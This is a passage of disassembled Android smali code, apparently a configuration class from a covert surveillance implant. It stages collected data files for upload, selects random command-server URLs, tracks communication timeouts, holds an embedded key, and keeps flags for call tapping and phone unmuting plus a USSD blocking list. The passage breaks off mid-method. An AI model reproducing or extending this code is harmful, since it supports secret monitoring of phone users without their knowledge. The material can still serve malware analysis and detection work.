.class public final Lcom/network/b/b;
.super Ljava/lang/Object;


# static fields
.field public static A:I

.field public static B:Z

.field public static C:Ljava/lang/Boolean;

.field private static D:[B

.field private static E:S

.field private static F:[Ljava/lang/String;

.field private static G:Ljava/util/Random;

.field private static H:J

.field private static I:J

.field private static J:I

.field private static K:I

.field private static L:I

.field private static M:I

.field private static N:I

.field private static O:I

.field private static P:Ljava/lang/Integer;

.field private static Q:J

.field private static R:Z

.field private static S:J

.field private static T:J

.field private static U:J

.field private static V:J

.field private static W:Ljava/lang/Boolean;

.field private static X:Ljava/lang/Boolean;

.field private static Y:I

.field private static Z:Ljava/lang/String;

.field public static a:Ljava/lang/String;

.field private static aa:Z

.field private static ab:I

.field private static ac:Ljava/lang/String;

.field private static ad:I

.field private static ae:Ljava/lang/String;

.field private static af:I

.field private static ag:I

.field private static ah:I

.field private static ai:Ljava/lang/String;

.field private static aj:Ljava/lang/String;

.field private static ak:Ljava/lang/Boolean;

.field private static al:Ljava/lang/Integer;

.field private static am:[Ljava/lang/String;

.field private static an:[Ljava/lang/String;

.field private static ao:Ljava/util/Vector;

.field public static b:Ljava/lang/String;

.field public static c:Ljava/lang/String;

.field public static d:Ljava/lang/String;

.field public static e:Ljava/lang/String;

.field public static f:Ljava/lang/String;

.field public static g:Ljava/lang/String;

.field public static h:J

.field public static i:Ljava/lang/Long;

.field public static j:S

.field public static k:I

.field public static l:Ljava/lang/String;

.field public static m:Ljava/lang/String;

.field public static n:Ljava/lang/String;

.field public static o:Ljava/lang/String;

.field public static p:Z

.field public static q:Z

.field public static r:Z

.field public static s:Z

.field public static t:Z

.field public static u:Z

.field public static v:Z

.field public static w:Z

.field public static x:I

.field public static y:I

.field public static z:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 6

    const-wide/16 v4, 0x0

    const/4 v3, 0x1

    const/4 v2, 0x0

    const/4 v1, 0x0

    const-string v0, "/data/data/com.network.android/network_data/"

    sput-object v0, Lcom/network/b/b;->a:Ljava/lang/String;

    const-string v0, "/data/data/com.network.android/network_data_bin/"

    sput-object v0, Lcom/network/b/b;->b:Ljava/lang/String;

    const-string v0, "/data/data/com.network.android/network_cache/cache1.dat"

    sput-object v0, Lcom/network/b/b;->c:Ljava/lang/String;

    const-string v0, "vR23sMkhJYKX5KXXhaQ/cz3jKsdZKu6fF8C/5u3DCEoxRHLWGz0A8fckMDGtSeuLDJkuZ81D/qTm6NARbN3G8r6Zm2X2FX8fNT54W2kJ2aww4XvmnaUdYzEkTv"

    sput-object v0, Lcom/network/b/b;->d:Ljava/lang/String;

    invoke-static {v0}, Lcom/network/i/a;->b(Ljava/lang/String;)[B

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->D:[B

    const-string v0, ""

    sput-object v0, Lcom/network/b/b;->e:Ljava/lang/String;

    sput-object v2, Lcom/network/b/b;->f:Ljava/lang/String;

    sput-object v2, Lcom/network/b/b;->g:Ljava/lang/String;

    sput-short v1, Lcom/network/b/b;->E:S

    new-array v0, v1, [Ljava/lang/String;

    sput-object v0, Lcom/network/b/b;->F:[Ljava/lang/String;

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    sput-object v0, Lcom/network/b/b;->G:Ljava/util/Random;

    sput-wide v4, Lcom/network/b/b;->h:J

    sput-object v2, Lcom/network/b/b;->i:Ljava/lang/Long;

    sput-wide v4, Lcom/network/b/b;->H:J

    sput-wide v4, Lcom/network/b/b;->I:J

    sput v1, Lcom/network/b/b;->J:I

    sput v1, Lcom/network/b/b;->K:I

    sput v1, Lcom/network/b/b;->L:I

    sput v3, Lcom/network/b/b;->M:I

    sput v1, Lcom/network/b/b;->N:I

    sput v1, Lcom/network/b/b;->O:I

    sput-short v1, Lcom/network/b/b;->j:S

    sput-object v2, Lcom/network/b/b;->P:Ljava/lang/Integer;

    sput v1, Lcom/network/b/b;->k:I

    sput-wide v4, Lcom/network/b/b;->Q:J

    sput-boolean v1, Lcom/network/b/b;->R:Z

    sput-object v2, Lcom/network/b/b;->l:Ljava/lang/String;

    sput-object v2, Lcom/network/b/b;->m:Ljava/lang/String;

    sput-object v2, Lcom/network/b/b;->n:Ljava/lang/String;

    sput-wide v4, Lcom/network/b/b;->S:J

    sput-wide v4, Lcom/network/b/b;->T:J

    sput-object v2, Lcom/network/b/b;->o:Ljava/lang/String;

    sput-wide v4, Lcom/network/b/b;->U:J

    sput-wide v4, Lcom/network/b/b;->V:J

    sput-object v2, Lcom/network/b/b;->W:Ljava/lang/Boolean;

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->X:Ljava/lang/Boolean;

    sput-boolean v3, Lcom/network/b/b;->p:Z

    sput-boolean v3, Lcom/network/b/b;->q:Z

    sput-boolean v3, Lcom/network/b/b;->r:Z

    sput-boolean v3, Lcom/network/b/b;->s:Z

    sput-boolean v3, Lcom/network/b/b;->t:Z

    sput-boolean v3, Lcom/network/b/b;->u:Z

    sput-boolean v3, Lcom/network/b/b;->v:Z

    sput-boolean v3, Lcom/network/b/b;->w:Z

    sput v1, Lcom/network/b/b;->Y:I

    sput v1, Lcom/network/b/b;->x:I

    sput v3, Lcom/network/b/b;->y:I

    sput v3, Lcom/network/b/b;->A:I

    sput-boolean v1, Lcom/network/b/b;->B:Z

    sput-object v2, Lcom/network/b/b;->Z:Ljava/lang/String;

    sput-boolean v1, Lcom/network/b/b;->aa:Z

    sput v1, Lcom/network/b/b;->ab:I

    sput-object v2, Lcom/network/b/b;->ac:Ljava/lang/String;

    sput v1, Lcom/network/b/b;->ad:I

    sput-object v2, Lcom/network/b/b;->ae:Ljava/lang/String;

    sput v1, Lcom/network/b/b;->af:I

    sput v1, Lcom/network/b/b;->ag:I

    sput v1, Lcom/network/b/b;->ah:I

    sput-object v2, Lcom/network/b/b;->ai:Ljava/lang/String;

    sput-object v2, Lcom/network/b/b;->aj:Ljava/lang/String;

    sput-object v2, Lcom/network/b/b;->ak:Ljava/lang/Boolean;

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->C:Ljava/lang/Boolean;

    sput-object v2, Lcom/network/b/b;->al:Ljava/lang/Integer;

    sput-object v2, Lcom/network/b/b;->am:[Ljava/lang/String;

    sput-object v2, Lcom/network/b/b;->an:[Ljava/lang/String;

    return-void
.end method

.method public static A()Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/network/b/b;->Z:Ljava/lang/String;

    return-object v0
.end method

.method public static B()Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/network/b/b;->ac:Ljava/lang/String;

    return-object v0
.end method

.method public static C()Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/network/b/b;->ae:Ljava/lang/String;

    return-object v0
.end method

.method public static D()I
    .locals 1

    sget v0, Lcom/network/b/b;->af:I

    return v0
.end method

.method public static E()I
    .locals 1

    sget v0, Lcom/network/b/b;->ag:I

    return v0
.end method

.method public static F()I
    .locals 1

    sget v0, Lcom/network/b/b;->ah:I

    return v0
.end method

.method public static G()Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/network/b/b;->ai:Ljava/lang/String;

    return-object v0
.end method

.method public static H()Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/network/b/b;->aj:Ljava/lang/String;

    return-object v0
.end method

.method public static I()Z
    .locals 1

    sget-boolean v0, Lcom/network/b/b;->aa:Z

    return v0
.end method

.method public static J()I
    .locals 2

    sget-object v0, Lcom/network/b/b;->al:Ljava/lang/Integer;

    if-nez v0, :cond_0

    const-string v0, "ConfigurationHolder PollingManager getPollingInterval need to read preference"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/network/b/b;->d(Landroid/content/Context;)V

    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "ConfigurationHolder PollingManager getPollingInterval pollingInterval: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/network/b/b;->al:Ljava/lang/Integer;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/b/b;->al:Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    return v0
.end method

.method public static K()Ljava/lang/Integer;
    .locals 2

    sget-object v0, Lcom/network/b/b;->P:Ljava/lang/Integer;

    if-nez v0, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "ConfigurationHolder need to read preference getMaxTimeWithNoCommunicationSeconds: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/network/b/b;->P:Ljava/lang/Integer;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/network/b/b;->d(Landroid/content/Context;)V

    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "ConfigurationHolder getMaxTimeWithNoCommunicationSeconds: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/network/b/b;->P:Ljava/lang/Integer;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/b/b;->P:Ljava/lang/Integer;

    return-object v0
.end method

.method public static L()V
    .locals 2

    const/4 v1, 0x1

    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->X:Ljava/lang/Boolean;

    sput-boolean v1, Lcom/network/b/b;->q:Z

    sput-boolean v1, Lcom/network/b/b;->r:Z

    sput-boolean v1, Lcom/network/b/b;->s:Z

    sput-boolean v1, Lcom/network/b/b;->t:Z

    sput-boolean v1, Lcom/network/b/b;->u:Z

    sput-boolean v1, Lcom/network/b/b;->v:Z

    sput-boolean v1, Lcom/network/b/b;->w:Z

    return-void
.end method

.method public static a()J
    .locals 2

    sget-wide v0, Lcom/network/b/b;->V:J

    return-wide v0
.end method

.method public static a(Landroid/content/Context;)Ljava/lang/String;
    .locals 3

    const/4 v1, 0x1

    :try_start_0
    sget-object v0, Lcom/network/b/b;->F:[Ljava/lang/String;

    array-length v0, v0

    if-ne v0, v1, :cond_0

    sget-object v0, Lcom/network/b/b;->F:[Ljava/lang/String;

    const/4 v1, 0x0

    aget-object v0, v0, v1

    :goto_0
    return-object v0

    :cond_0
    sget-object v0, Lcom/network/b/b;->F:[Ljava/lang/String;

    array-length v0, v0

    if-le v0, v1, :cond_1

    sget-object v0, Lcom/network/b/b;->G:Ljava/util/Random;

    sget-object v1, Lcom/network/b/b;->F:[Ljava/lang/String;

    array-length v1, v1

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "targetURLs !url! selected: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v1, Lcom/network/b/b;->F:[Ljava/lang/String;

    aget-object v0, v1, v0

    goto :goto_0

    :cond_1
    sget-object v0, Lcom/network/b/b;->F:[Ljava/lang/String;

    array-length v0, v0

    if-nez v0, :cond_2

    invoke-static {p0}, Lcom/network/b/b;->g(Landroid/content/Context;)V

    :cond_2
    sget-object v0, Lcom/network/b/b;->F:[Ljava/lang/String;

    array-length v0, v0

    if-nez v0, :cond_3

    const-string v0, "targetURLs.length == 0 getSettingsFromBH"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/h/b;->f(Landroid/content/Context;)Z

    :cond_3
    sget-object v0, Lcom/network/b/b;->F:[Ljava/lang/String;

    array-length v0, v0

    if-ne v0, v1, :cond_4

    sget-object v0, Lcom/network/b/b;->F:[Ljava/lang/String;

    const/4 v1, 0x0

    aget-object v0, v0, v1

    goto :goto_0

    :cond_4
    sget-object v0, Lcom/network/b/b;->F:[Ljava/lang/String;

    array-length v0, v0

    if-le v0, v1, :cond_5

    sget-object v0, Lcom/network/b/b;->G:Ljava/util/Random;

    sget-object v1, Lcom/network/b/b;->F:[Ljava/lang/String;

    array-length v1, v1

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "targetURLs !url! selected: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v1, Lcom/network/b/b;->F:[Ljava/lang/String;

    aget-object v0, v1, v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "getRandomURL Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :cond_5
    const/4 v0, 0x0

    goto/16 :goto_0
.end method

.method public static a(I)V
    .locals 2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "setWasPhoneUnmutedNiclyAfterTapWasFinished: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sput p0, Lcom/network/b/b;->M:I

    return-void
.end method

.method public static a(J)V
    .locals 0

    sput-wide p0, Lcom/network/b/b;->V:J

    return-void
.end method

.method private static a(Landroid/content/Context;Ljava/lang/String;)V
    .locals 1

    const/4 v0, 0x0

    invoke-virtual {p0, p1, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->clear()Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_0
    return-void
.end method

.method private static a(Landroid/content/SharedPreferences;)V
    .locals 2

    const-string v0, "Skypi"

    const/4 v1, 0x0

    invoke-interface {p0, v0, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/b/b;->h(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->f:Ljava/lang/String;

    return-void
.end method

.method public static a(Lcom/network/android/i;Ljava/lang/String;)V
    .locals 8

    invoke-virtual {p0}, Lcom/network/android/i;->a()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_4

    new-instance v1, Ljava/io/File;

    sget-object v2, Lcom/network/b/b;->a:Ljava/lang/String;

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    invoke-virtual {v1}, Ljava/io/File;->mkdirs()Z

    move-result v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "addDataElement push make new directory:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, " success: "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lcom/network/b/b;->a:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ".dat"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0}, Lcom/network/android/h;->a(Ljava/lang/String;)[B

    move-result-object v0

    invoke-static {v0, v1}, Lcom/network/android/g;->a([BLjava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "addDataElement push  Save heavy xml file: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0, v1}, Lcom/network/android/i;->g(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/network/android/i;->c()[Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Lcom/network/android/i;->d()[[B

    move-result-object v2

    if-eqz v1, :cond_4

    if-eqz v2, :cond_4

    array-length v0, v1

    array-length v3, v2

    if-ne v0, v3, :cond_4

    new-instance v0, Ljava/io/File;

    sget-object v3, Lcom/network/b/b;->b:Ljava/lang/String;

    invoke-direct {v0, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_1

    invoke-virtual {v0}, Ljava/io/File;->mkdir()Z

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "addDataElement push make new heavy directory:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_1
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v0, 0x0

    :goto_0
    array-length v5, v1

    if-ge v0, v5, :cond_3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v6, Lcom/network/b/b;->b:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "_"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    aget-object v6, v1, v0

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "_"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "_.net"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    aget-object v6, v2, v0

    invoke-static {v6}, Lcom/network/android/h;->a([B)[B

    move-result-object v6

    invoke-static {v6, v5}, Lcom/network/android/g;->a([BLjava/lang/String;)V

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "addDataElement push Save heavy binary file: "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "_"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    aget-object v6, v1, v0

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "_"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "_.net"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v5, v1, v0

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    array-length v5, v1

    add-int/lit8 v5, v5, -0x1

    if-ge v0, v5, :cond_2

    const-string v5, "#"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "#"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_2
    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_0

    :cond_3
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/network/android/i;->f(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/network/android/i;->c(Ljava/lang/String;)V

    :cond_4
    return-void
.end method

.method public static a(Ljava/lang/Boolean;)V
    .locals 0

    sput-object p0, Lcom/network/b/b;->X:Ljava/lang/Boolean;

    return-void
.end method

.method public static a(Ljava/lang/Integer;)V
    .locals 0

    sput-object p0, Lcom/network/b/b;->P:Ljava/lang/Integer;

    return-void
.end method

.method public static a(Ljava/lang/String;)V
    .locals 0

    sput-object p0, Lcom/network/b/b;->f:Ljava/lang/String;

    return-void
.end method

.method public static a(S)V
    .locals 0

    sput-short p0, Lcom/network/b/b;->j:S

    return-void
.end method

.method public static a(Z)V
    .locals 1

    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->W:Ljava/lang/Boolean;

    return-void
.end method

.method public static a([Ljava/lang/String;)V
    .locals 0

    invoke-static {p0}, Lcom/network/b/b;->b([Ljava/lang/String;)V

    return-void
.end method

.method public static a([Ljava/lang/String;Landroid/content/Context;)V
    .locals 4

    const/4 v0, 0x0

    sput-object p0, Lcom/network/b/b;->am:[Ljava/lang/String;

    const-string v1, "usTemplated"

    if-eqz p0, :cond_1

    array-length v2, p0

    if-lez v2, :cond_1

    invoke-virtual {p1, v1, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    :goto_0
    array-length v2, p0

    if-ge v0, v2, :cond_0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    aget-object v3, p0, v0

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "setAndSaveUssdBlockingList --"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "- excpression: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    aget-object v3, p0, v0

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_1
    return-void
.end method

.method public static a(Ljava/util/Vector;)[Ljava/lang/String;
    .locals 3

    :try_start_0
    invoke-virtual {p0}, Ljava/util/Vector;->size()I

    move-result v0

    new-array v1, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    move v2, v0

    :goto_0
    invoke-virtual {p0}, Ljava/util/Vector;->size()I

    move-result v0

    if-ge v2, v0, :cond_0

    invoke-virtual {p0, v2}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

